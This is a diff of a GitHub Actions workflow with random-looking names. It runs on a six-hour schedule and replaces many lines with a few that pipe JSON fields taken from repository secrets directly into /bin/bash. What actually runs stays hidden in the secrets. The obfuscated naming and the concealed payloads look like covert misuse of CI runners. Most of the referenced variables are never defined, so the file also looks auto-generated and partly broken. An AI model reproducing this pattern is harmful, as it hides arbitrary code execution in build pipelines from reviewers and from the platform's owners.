@@ -3,39 +3,19 @@ name: sichuoch
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 2/6 * * *'
+    - cron: '53 4/6 * * *'
 
-jobs:  # 6341
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sichuoch
         env:
-          jov8007: ${{ secrets.jov8007 }}
+          tewie19: ${{ secrets.tewie19 }}
         run: |
-          echo $jov8007 | jq -r .zjle3 | /bin/bash
-          echo $fhom45037 | jq -r .o31 | /bin/bash
-          echo $nvjiq79 | jq -r .d73074 | /bin/bash
-          echo $bpxhu99210 | jq -r .bfz19560 | /bin/bash
-          echo $iw19 | jq -r .v71 | /bin/bash
-          echo $pq4386 | jq -r .ykvry4796 | /bin/bash
-          echo $vt43666 | jq -r .pqiz0 | /bin/bash
-          echo $duv75 | jq -r .r68 | /bin/bash
-          echo $tbhas7380 | jq -r .fkl65 | /bin/bash
-          echo $djkmb987 | jq -r .r43 | /bin/bash
-          echo $o12 | jq -r .t516 | /bin/bash
-          echo $kox87 | jq -r .hz7148 | /bin/bash
-          echo $zn080 | jq -r .pz41589 | /bin/bash
-          echo $qp037 | jq -r .azgb43416 | /bin/bash
-          echo $ig190 | jq -r .jyyn386 | /bin/bash
-          echo $zmfxy0 | jq -r .qnmfo5 | /bin/bash
-          echo $a258 | jq -r .y6 | /bin/bash
-          echo $fdy63 | jq -r .nxm7 | /bin/bash
-          echo $ahaw19955 | jq -r .o99 | /bin/bash
-          echo $wtv65199 | jq -r .s49 | /bin/bash
-          echo $bj7 | jq -r .pwqp3 | /bin/bash
-          echo $fv970 | jq -r .belr6 | /bin/bash
-          echo $oagwr2 | jq -r .wioom557 | /bin/bash
+          echo $tewie19 | jq -r .curuv19215 | /bin/bash
+          echo $urlh11 | jq -r .ytff7 | /bin/bash
+          echo $q85117 | jq -r .ln914 | /bin/bash
+          echo $bgi57 | jq -r .zdsgh01 | /bin/bash
 
